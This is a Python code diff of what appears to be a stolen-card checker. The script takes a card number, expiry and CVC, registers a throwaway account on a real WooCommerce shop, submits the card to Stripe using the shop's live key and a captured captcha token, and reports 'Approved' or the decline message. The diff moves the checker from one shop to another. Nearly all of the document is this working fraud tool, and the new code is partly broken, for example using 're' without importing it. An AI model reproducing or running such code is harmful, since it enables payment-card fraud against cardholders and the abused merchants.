@@ -97,7 +97,7 @@ amuue8e822an44%7C1730032845%7C3NL7zXGafMAdVJRIS5542kdKnKU9T1PFjoNbBFBRYBW%7Ce088
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
 }
 
   response = requests.get('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
@@ -149,7 +149,7 @@ amuue8e822an44%7C1730032845%7C3NL7zXGafMAdVJRIS5542kdKnKU9T1PFjoNbBFBRYBW%7Ce088
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
     'x-requested-with': 'XMLHttpRequest',
 }
   data = {
@@ -180,7 +180,7 @@ amuue8e822an44%7C1730032845%7C3NL7zXGafMAdVJRIS5542kdKnKU9T1PFjoNbBFBRYBW%7Ce088
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
 }
 
   json_data = {
@@ -255,7 +255,7 @@ amuue8e822an44%7C1730032845%7C3NL7zXGafMAdVJRIS5542kdKnKU9T1PFjoNbBFBRYBW%7Ce088
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': user,
 }
 
   data = {
@@ -300,171 +300,121 @@ amuue8e822an44%7C1730032845%7C3NL7zXGafMAdVJRIS5542kdKnKU9T1PFjoNbBFBRYBW%7Ce088
     
     
     
-import requests
-import re
-import random
-import string
-import base64
-from getuseragent import UserAgent
-from user_agent import generate_user_agent
-
+import requests,random,string
 def Tele3(ccx):
-    ccx = ccx.strip()
-    parts = re.split(r'[ |/]', ccx)
-    n = parts[0]
-    mm = parts[1]
-    yy = parts[2]
-    cvc = parts[3]
-
-    print(n, mm, yy, cvc)
-
-    r = requests.session()
-    user = generate_user_agent()
-
-    def generate_random_account():
-        name = ''.join(random.choices(string.ascii_lowercase, k=20))
-        number = ''.join(random.choices(string.digits, k=4))
-        return f"{name}{number}@yahoo.com"
-    acc = generate_random_account()
-
-    def username():
-        name = ''.join(random.choices(string.ascii_lowercase, k=20))
-        number = ''.join(random.choices(string.digits, k=20))
-        return f"{name}{number}"
-    username = username()
-
-    def generate_random_code(length=32):
-        letters_and_digits = string.ascii_letters + string.digits
-        return ''.join(random.choice(letters_and_digits) for _ in range(length))
-
-    corr = generate_random_code()
-    sess = generate_random_code()
-
-    headers = {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User ': '?1',
-        'Upgrade-Insecure-Requests': '1',
-        'User -Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-    }
-
-    response = r.get('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers)
-
-    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-
-    headers = {
-        'authority': 'aptekaleki24.co.uk',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://aptekaleki24.co.uk',
-        'referer': 'https://aptekaleki24.co.uk/my-account-2',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': user,
-    }
-
-    data = {
-        'email': acc,
-        'privacy_policy': 'on',
-        'woocommerce-register-nonce': register,
-        '_wp_http_referer': '/my-account-2',
-        'register': 'Zarejestruj się',
-    }
-
-    response = r.post('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers, data=data)
-
-    headers = {
-        'authority': 'aptekaleki24.co.uk',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'referer': 'https://aptekaleki24.co.uk/my-account-2/payment-methods',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': user,
-    }
-
-    response = r.get('https://aptekaleki24.co.uk/my-account-2/add-payment-method', cookies=r.cookies, headers=headers)
-
-    nonce = re.findall(r'"add_card_nonce":"(.*?)"', response.text)[0]
-    print(nonce)
-
-    headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': user,
-    }
-
-    data = f'type=card&billing_details[name]=+&billing_details[email]=makk2882%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=07085d6f-c819-4cc2-bf19-bbd3c19e0b4ec756b1&muid=b0cef40a-e0b4-4f5f-8b68-ae5c25ed66fb0f87ec&sid=27d86006-21ea-4836-87aa-f33def9368bbb523ef&pasted_fields=number&payment_user_agent=stripe.js%2F8f1da5bf41%3B+stripe-js-v3%2F8f1da5bf41%3B+card-element&referrer=https%3A%2F%2Faptekaleki24.co.uk&time_on_page=50390&key=pk_live_51IQzDCBKZpsKrCkNMyqzdD1smhnXungJIcpefiOevrq8VOUZc4YE2ehVLdUr6NMTqMWzY5bA3d3o9petmZSoOyvU00u8Awtmy3&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoibENSc09Jbjd6MU1BZDRtaDZVcE1TbUVEMVAra2RzS0RSelhrZDVPWVlHdmMvTVg5N0haeUN1SnEraDdsazhER01GdGNMYmFyTkg2Z1NlSWpsNzQwcTVDTG80OXJvcHZWclFZTUpIRExJYVVWd0Q3cHdtVWZDTVQxQURHM2NLRi9pMU96WFo4Umd4Q1pmLzJPb2F2RHRvK2lUS0ZsL2RDdlV5dXFyL1owSXZManAzT0JRSXNhVGlvS3cwRENyc0xkeXR1TURjYzZyem1XUEEvdkhGMWRLUTMwb2k5MUhHRnFoR1pNWWVsNUpwWGpsNWFLZmltZjBuREZjNHJCUWJDOXlHMFlRTUFoc281MUpvQjBRS0lJK0JRVHRFWjhGUld1QlRhcFp4WkFlQ3prSUpYejVUeldBTEZyYlpiRnBienErRC9ML0IyUllIN25xdGFkVXpEK2pFTE5rU29HY0kvL29pbXBMYzA4MkdGK3FKanpjTFlqYmt1U0JrbnZNazdzM0RTWHhWZzl4OE04KzcvWmNqRC96WE VaQStVZ jdYQVpUcXV5TmZFeXVkZjRDRGUvdy9GakxQSnJnOWpMck04VE0xY2x4blJ1T0V5dWlQdTMxZUJabkk1TXRtcHNSRUVtYUZvVFl5WHVSZW1xNTBBdEphNUxLQjlCZGxneHRDMFozbExlU1Z0ZFNqNFFqZXI3cXVUOGhoWEd2T0dwdzhzYVB4bkV3bHBNbHU0ckNDR1NqN2tNVDRSS3BZUVZXeVZobnRtcGZ6VjhrL243S0lZeUhrZFFRZDhsVmxxNmtxSEt2THNaNzNIZVEzUUFEbnpRS1pRL3NYUm9xYUh3TWFJOW5wcDNOeXZ4VmNEMzhhNngzcjVLMnl5U3RxSVBFSWhhMjJkdDJVazlFemk4UmNTYXpiODhpY3NLdHdTbGlRa1ErbmpWSW9zMFJhdGlpUnV2anNlNU9BbStLMjRDeVo3Sys0M3BNaE1ib2hPWGIvYjlYOGFJcUtkM1Zxa1c0a0ZIVTJ6MFNQSTE5ZFVOWEZ3SFowa1Q3dlc0ckhjdVZ6NVFqMGFkbFg1RVdQYXhWRU1wQURvRVltdmVwbUZPRGd3azFXL2JTb2NSak5QTE5YbjNDL3Y3UXNzZFR1R0Rxb2pHNXlYeWZLL25USXNZeThMeW9Id1hEbFU1cXlKUkQ4ZXFOYmJjU1hkZmNnMk91UTlHYnhoYWk4b3pXcG5IY1dZRC9rdXlBb0ljRk94eDErT0VmMS9CajcxRUQwN1VldC9rRlFLZFd4a0xwZ1NPQ0U5Vkd5OGR3TnN5OGt3N2x4QjJEU1FtVXJLK1lFUjdpRWl2MnhIREpvMHdRdkpVYVpkYzBOcVpNRk9JNU5rUkdVSkF5UFJ2cnpRQXhqUmJ2MmZmT1ZvWExuWFFBL2FldUgzMEdHaGIraFd5em1RblNLOXRIeGtTWU5NNFRmNjg5NGJUNG1KSVVwdlZsTy9jRkpSUXA1UE5ZUWQyWCtkbHVxMmhzd0ZRY212SnhEZWxKQzhjNjV3djFRTi9rcXNxZWI0OGExWU9FSjNZU2Q5T3ZudmlMczRqRk9HTjFJMFFNUXBhRUFtU3AvRldxRGxuS1dhbUg3VnM1ZFN5S2Z0cWZXa2xGczhwSWRBMGJCL1FHVnpKbzFQMWVlYW1Ia2FPeERSMDlKd09sL1kvSG81T3lyQ2ZwZUJoWWFpa0s2MVFoR1lROWJWL3d3bUJjcnRvc3NxUlZrU25nRk80bnpveC9QZjNWUU5ZbG5EOENpaEFxOW5GQXBwNTZzcm5odzVZcVZNU1lPYUFhWnB4M1UwVWNGUS9ibHBpei9rUTZaY25TRTIxN3ZaYzRtVUszYVV6aWd6WHY5ZkZmYUVpTGF6MHN3RWdJSEU2a25WbmtLMHFUQ1FSWTArUlU3VGh1'
-
-    response = requests .post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-
-    if not 'id' in response.json():
-        print('ERORR CARD')
-    else:
-        id = response.json()['id']
-        print(id)
-
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://aptekaleki24.co.uk',
-        'referer': 'https://aptekaleki24.co.uk/my-account-2/add-payment-method',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': user,
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    params = {
-        'wc-ajax': 'wc_stripe_create_setup_intent',
-    }
-
-    data = {
-        'stripe_source_id': id,
-        'nonce': nonce,
-    }
-    try:
-        response = r.post('https://aptekaleki24.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
-        i = (response.json()['error']['message'])
-        print(i)
-        return i
-    except:
-        print(response.json()['status'])
-        return 'Approved'
+	import requests
+	
+	rs = requests.session()
+	ccx = ccx.strip()
+	parts = re.split(r'[ |/]', ccx)
+	n = parts[0]
+	mm = parts[1]
+	yy = parts[2]
+	cvc = parts[3]
+	print(n, mm, yy, cvc)
+	
+	
+	
+	
+	def gen_email():
+		    
+		    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
+		
+		    name_length = 8
+		    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
+		    domain = random.choice(domains)
+		    email = f"{name}@{domain}"
+		    return email
+	headers = {
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	response = rs.get('https://www.workerkit.com/my-account/',headers=headers)
+	nonce=(response.text.split('"_wpnonce" value="')[1].split('"')[0])
+	print(nonce)
+	params = {
+	    'action': 'register'}
+	data = {
+	    'email': gen_email(),
+	    'email_2': '',
+	    'wc_order_attribution_source_type': 'typein',
+	    'wc_order_attribution_referrer': '(none)',
+	    'wc_order_attribution_utm_campaign': '(none)',
+	    'wc_order_attribution_utm_source': '(direct)',
+	    'wc_order_attribution_utm_medium': '(none)',
+	    'wc_order_attribution_utm_content': '(none)',
+	    'wc_order_attribution_utm_id': '(none)',
+	    'wc_order_attribution_utm_term': '(none)',
+	    'wc_order_attribution_utm_source_platform': '',
+	    'wc_order_attribution_utm_creative_format': '',
+	    'wc_order_attribution_utm_marketing_tactic': '',
+	    'wc_order_attribution_session_entry': 'https://www.workerkit.com/my-account/payment-methods/',
+	    'wc_order_attribution_session_start_time': '2024-10-16 04:07:01',
+	    'wc_order_attribution_session_pages': '2',
+	    'wc_order_attribution_session_count': '1',
+	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    '_wpnonce': nonce,
+	    '_wp_http_referer': '/my-account/payment-methods/',
+	    'register': 'Register',
+	}
+	
+	response = rs.post('https://www.workerkit.com/my-account/add-payment-method', params=params, headers=headers, data=data)
+	nonce=(response.text.split('add_card_nonce":"')[1].split('"')[0])
+	print(nonce)
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'cache-control': 'no-cache',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'pragma': 'no-cache',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'type=card&billing_details[name]=+&billing_details[email]=hshsbw%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75&sid=63882531-a3ba-45bf-8e52-1d625f36e89b98cb7d&payment_user_agent=stripe.js%2F33292c709a%3B+stripe-js-v3%2F33292c709a%3B+split-card-element&referrer=https%3A%2F%2Fwww.workerkit.com&time_on_page=24064&key=pk_live_51GholBG8PCD7UYBPuFidLoam9lWf3GizFLYytInafpBv36CFnpJ61SsJ7MBmuqcpqky9d9Tmk1ovboifO2lIxpI5005cLYIFLy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZEl5b1Jnc3o4d2ZPdGJId0tJc2RyUkZhWDVoMi81Rlp2Wm9rUmhiMjhjTEtjK3IxOW03YnA0K3ZCa1VaTjNOZGduTmVSbVFnMytPdUxTa2tmTUZidGU4bWI4b3JsTDdxcWpDSXN5OXBVK2Y4QnFlbk83YUFITE1XZ0Q4SFp5ay9Kc1pFVG9sbmVJYXpiN09CWVh0TTVQOFpGNktQVnFnTUNmZ0ZyZ3RlYTg5TlBiVkhEU0NrUkNZNDd5Q1YyakEyZ3BJZW8xYk9wcFJvSWlVMk5qbndzS0RjTTMxNDA3dFlLNHFJKy94R2t1NDdIZG9rZmZ2cGI0SzFYV2JId3cxS0JxdXp0Qm9MSlVjNUMyUWlqTmoxYkp2aFQ0d0tlUXFjY011bnBseXUrWGFWYTdFcHdRY3N2eWFPLzBjWFQxY0V2NURUR0V1aDZuT1dhYkkyUUJObGZIQTZXUFFvVDlNcE93NHJtWlY2dCt5cTl3dmRzTHUrcjdrNnlRNXB6cXB1TklWSTlVMzNtMUU5WGMwUURYanM1eFByN0RKdGZxYTdkbDQvdmZOZGlvNlpKUHZPSXgyZGVkZ3RVT2hUS1FxTHRGRHYrVWtEV3RyOGt2ZlBLZ2tVUXVza0poTGlaYU1oQ3E5TkVDNE1CRTQ0ZEkvR2hqNEQraFBpSVZPbGlQdmJ5RzY5R3lxRmN3U29YSlQ2MmpuTlVJUlNlMzlZVEtIT3c0KzBKcGh1V0hRV0RoWWZKeGMrSXR6eHpZblVrUHlCRklCN2N0SG1nWTlwTGxHWkVVdC80cGF0NFBxaWlnZ0xzYU5vaHpxYjVBRFArRnlOUXpZazFDRHl0Zjk2QlNqYlhOLzBJSnpTTGJPSTY4U2s2alZTSHB3SENEMWl6VGJiUXZDUzFZM05sUkYrMm4yUUNxemtwRTg3OWxyR2czMjZKd0NXRUgrWFQ3RjRXcWNLczRncTRGTS9Nck9jYjJmeTYySTFjc1ZlWmtMTW1YMGtCZFRTR09XMFNodW5mY0IvWEhBZ0wrQTVuaXZWT0FJdWliTytCUGtVTDZYTXA5U2dCcjRiUDN6cC9NdjZQSzNka0pIYUVaUEhzdGVKNU14TDhvZ3NCbXNKSmQ0ekRWWTFBU2c2R1RXSzNtMFNSdmFxTTcxeHVYQXFZZTF5dUQycDA2akpmS1VPME9JaHkzdnFUekM0OC9mTTRDSDdRM1pjKzM4bk5IKzFtKzdwRmx6Skk3KzU5V0Z3RVNMU2xuVHZjRXc3TTkzVkFJcGYrTTVEWlZlU0FjNnoyaWtaeEJZSzE0SWYyR2oya1FhRUJiYUJzRGVhWmVUTVd2eXFYTTNtR3JkQ1BwekZ1bTkxOXEwbG93YUQwVzBteDk2RzBuVGlEN0pWdm5lUksyQis0NXdWL0J5dlQ3Z1pNbWo3UXZiQmRXbWhyTXczVVFIQjA5UzlGcW4zQXZqSnZJYkVNbWNHWTd3NS9WNUpSaE1UaUlPbjVHUTkzdUx2OHFUY2ZFdzhlcU1yL2MvU1UvcFdHeFhrTTFPODY4d09mYU84Y1NzOUNZZXd3eWN1MzhXVVZ2ZXBjTjl1Z0xHblpteGhzRGJFUmt0OGpNZlcrekF1SnlXUVZYenBDclkrL3B0RHRBSGNxT2dXZXNVOVVlaWVLV1duaUNSZWZzRXlJMXczYTkwajRVMUxGVlNjQmdVNDNNdk10OSthd0diMDlYcmVmbU1FS1MwSllMczlLWlUzS3lZSml6cnZxUlhaVG1oYjVYSlFKbU9RNGhOM0x2aHZ1RnNiYXo0MkcveU1YcXF3Z0sybEJRRXhqK2wxYlEwbFpCSmUyTEI0aUtBU3VjSUpZVkRyM0c3MVBjaHJJdFdzRDBuZExEWElqYzBzbXMxZkFiRGJ0NG1yMnJjNkt6NTdpeVNOUnFWbWJqcG8vRVFOMFZqV1NKK0lkMmhWYXpuUUhjSW90OEk4RERXelRVTG1OOFU5MUxLdklUMzQ1UGJ0N3RaVFA3bHhHUG5IeS95d3lCTHNMV25qTnU5azdBWnVtdE1hdWowdDJyVEpJazYxZTJpT09ZUG9Mek84M040Q1JiN21FOUJzREFQYWI0VUVpejJTTG01cTZBTlpnQVhEd0RtYVhKU0d0K0YrVWFIVk54eG80NXNoeHRJRlNkWEQyMTRtaTloRDdTUW9yM2VIVzZydjIvRUFYeTQ4MWNPa01kUEJLenJNZEgyNGo4T1NnL3RWUWNHeElSOEtpbjNsZEQxNmZoQmFtZEFLc0VmWlZFNlRpQzIySXhqR3RDbDhjMTZMZFdvOFRlVTZ5WGo2eXZlT3Z1SUZTelQ4Rmt0UW1lcXhyNG5FaVZTbUlSeE9FL2xwd0UzbktEcndvTE9iSVFwN3A0Wi93ZkFXSjBodk5MWGRGNmpxc013VjZTa0JvdWVJcXFOZzQwb3oxc2pDVHgwY0NzT1dZS2JxaHRJcVY1YTFxUDk0NFYzNU9lWkVZVEZqeGJmYWJ2cGZQbTlRZFNESWtrR2trN2NEa2dEN1p3NVV5azZRSzJvVmNEUFVvM2F6YXdMT092bFRRWUtPbnBHM0dpVGNNMVpUYThTeW1MUUQxME9kZHlramk3TC90Q3F0bm1ITG1oVlg1SlhNUUZTbXgzMWxDU1FvN2hxUU9EUXhzRXYzSUZOV0Z3NTF4M0ZRdElmZXR0VE83dHJrS2tLV2gvell4THVFNkEwV0c2YVlHcE1Jb1hUeG4zWEZ3d1BNTnE4N2FOazNWd2F6aWVlNk5WaWlNN1h0U244a1lWRHo4WXlXM2pKUExyZjJzTlAreXhLNU5HalJ5UEVGWElETFRBPT0iLCJleHAiOjE3MjkwNTA4NDAsInNoYXJkX2lkIjozMzk1MTAzMDMsImtyIjoiMzZlMDlhZCIsInBkIjowLCJjZGF0YSI6Im9ndVU5KytTd25CQWhlODhpTHN1TkVWSHpSeGNrMW1PcWJwTzJPQnhDZmk1aHlhRk5XUDNZYW9UbmdxRHc3VXFBaUJ1N3BiREtRbVRYV05KNFhiYXhLdUJDbE1jcCtqTzBKM1hOK0hvU0NvNWcrVnNjUEpEbFcwTklWMGw5dmpxWWJ3QktMRlVobE1ldFBxU0tJWTJFVnhrandFTDBhNTZmcUZUemFoYk5pb2I1SzhaYlQ0ZDA0ZHpZMVkwd1ZQcm96aEFWcFFEWW4zZksyS0MifQ.N0j0dZFyIDx79PwbqmZEyn1CludlaF_MVLx2VyUjp1A'
+	
+	response = rs.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	id=(response.json()['id'])
+	print(id)
+	import requests
+	
+	headers = {
+	    'authority': 'www.workerkit.com',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'cache-control': 'no-cache',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	     'origin': 'https://www.workerkit.com',
+	    'pragma': 'no-cache',
+	    'referer': 'https://www.workerkit.com/my-account/add-payment-method/',
+	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	params = {
+	    'wc-ajax': 'wc_stripe_create_setup_intent',
+	}
+	
+	data = {
+	    'stripe_source_id': id,
+	    'nonce': nonce,
+	}
+	
+	response = rs.post('https://www.workerkit.com/', params=params, cookies=rs.cookies, headers=headers, data=data)
+	try:
+		return (response.json()['error']['message'])
+	except:
+		return('Approved')
